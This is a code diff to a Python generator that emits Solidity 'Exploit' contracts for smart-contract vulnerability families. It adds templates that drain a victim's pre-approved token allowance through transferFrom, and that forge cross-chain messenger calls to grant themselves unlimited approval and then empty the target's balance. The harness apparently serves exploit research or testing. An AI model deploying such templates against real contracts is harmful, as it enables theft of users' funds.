@@ -33,6 +33,8 @@ def iter_defi_families(src: str, name: str) -> Iterator[Tuple[str, str]]:
     yield from _twap_window(s, fns, name)
     yield from _cross_getter_drain(s, fns, name)
     yield from _victim_approve(s, fns, name)
+    yield from _seeded_allowance_drain(s, fns, name)
+    yield from _cross_chain_bridge(s, fns, name)
 
 
 def _unpermissioned_callback(s, fns, name):
@@ -452,3 +454,115 @@ def _victim_approve(s, fns, name):
            if drain else "")
         + "    }\n    receive() external payable {}\n}\n",
     )
+
+
+def _seeded_allowance_drain(s, fns, name):
+    """No cheatcodes. Setup (or a prior victim tx) already approved the
+    target/attacker. We transferFrom the named victim and/or call pull()."""
+    if not re.search(r"transferFrom|allowance|approve", s):
+        return
+    victim_fn = next(
+        (f["name"] for f in fns if re.match(
+            r"^(victim|user|alice|holder|player)$", f["name"] or "", re.I)),
+        None,
+    )
+    if not victim_fn:
+        m = re.search(r"address\s+(?:public\s+)(victim|user|alice|holder|player)\b", s)
+        if m:
+            victim_fn = m.group(1)
+    if not victim_fn:
+        return
+    pull = next(
+        (f for f in fns if f["external"] and re.search(
+            r"pull|collect|drain|borrow|withdraw", f["name"], re.I)),
+        None,
+    )
+    yield (
+        f"seeded-allowance:{victim_fn}",
+        HEADER
+        + "// Family: victim already approved (Setup / world.txs). No prank.\n"
+        + "interface IERC20 {\n"
+        + "    function transferFrom(address,address,uint256) external returns (bool);\n"
+        + "    function balanceOf(address) external view returns (uint256);\n"
+        + "    function allowance(address,address) external view returns (uint256);\n}\n"
+        + "interface IT {\n"
+        + f"    function {victim_fn}() external view returns (address);\n"
+        + "    function token() external view returns (address);\n"
+        + (f"    function {pull['name']}() external payable;\n" if pull and not pull["args"] else "")
+        + (f"    function {pull['name']}(uint256) external payable;\n" if pull and pull["args"] else "")
+        + "}\n"
+        + "contract Exploit {\n"
+        + "    function run(address t) external payable {\n"
+        + f"        address v = IT(t).{victim_fn}();\n"
+        + "        address tok; try IT(t).token() returns (address k) { tok = k; } catch {}\n"
+        + "        if (v != address(0) && tok != address(0)) {\n"
+        + "            uint256 a = IERC20(tok).allowance(v, t);\n"
+        + "            if (a == 0) a = IERC20(tok).allowance(v, address(this));\n"
+        + "            uint256 b = IERC20(tok).balanceOf(v);\n"
+        + "            if (a > 0 && b > 0) {\n"
+        + "                uint256 n = a < b ? a : b;\n"
+        + "                try IERC20(tok).transferFrom(v, address(this), n) {} catch {}\n"
+        + "            }\n"
+        + "        }\n"
+        + (("        try IT(t)." + pull["name"] + "{value: msg.value}("
+            + ("1 ether" if pull["args"] else "") + ") {} catch {}\n") if pull else "")
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _cross_chain_bridge(s, fns, name):
+    """Same-EVM mock of a messenger. lzReceive / relayMessage / handle
+    with attacker-controlled payload. Not two real chains."""
+    bridge_fn = None
+    for f in fns:
+        if re.match(
+            r"^(lzReceive|relayMessage|finalizeWithdrawal|finalizeBridge|"
+            r"onMessageReceived|handle)$",
+            f["name"] or "",
+        ):
+            bridge_fn = f
+            break
+    if not bridge_fn:
+        return
+    yield (
+        f"cross-chain:{bridge_fn['name']}",
+        HEADER
+        + "// Family: same-EVM cross-chain messenger. Attacker is the other 'chain'.\n"
+        + "interface IERC20 {\n"
+        + "    function approve(address,uint256) external returns (bool);\n"
+        + "    function transferFrom(address,address,uint256) external returns (bool);\n"
+        + "    function balanceOf(address) external view returns (uint256);\n}\n"
+        + f"interface IT {{ function {bridge_fn['name']}("
+        + _iface_args(bridge_fn)
+        + ") external payable; "
+        + "function token() external view returns (address); }\n"
+        + "contract Exploit {\n"
+        + "    function run(address t) external payable {\n"
+        + "        bytes memory payload = abi.encodeWithSignature(\n"
+        + '            "approve(address,uint256)", address(this), type(uint256).max);\n'
+        + _call_bridge(bridge_fn)
+        + "        address tok; try IT(t).token() returns (address k) { tok = k; } catch {}\n"
+        + "        if (tok != address(0)) {\n"
+        + "            uint256 b = IERC20(tok).balanceOf(t);\n"
+        + "            if (b > 0) { try IERC20(tok).transferFrom(t, address(this), b) {} catch {} }\n"
+        + "        }\n"
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _call_bridge(fn):
+    pieces = []
+    for t, _n in fn["args"]:
+        tl = t.lower()
+        if tl.startswith("bytes"):
+            pieces.append("payload")
+        elif "address" in tl:
+            pieces.append("address(this)")
+        elif tl.startswith("uint"):
+            pieces.append("0")
+        elif tl == "bool":
+            pieces.append("false")
+        else:
+            pieces.append("0")
+    joined = ", ".join(pieces)
+    return f"        try IT(t).{fn['name']}{{value: msg.value}}({joined}) {{}} catch {{}}\n"
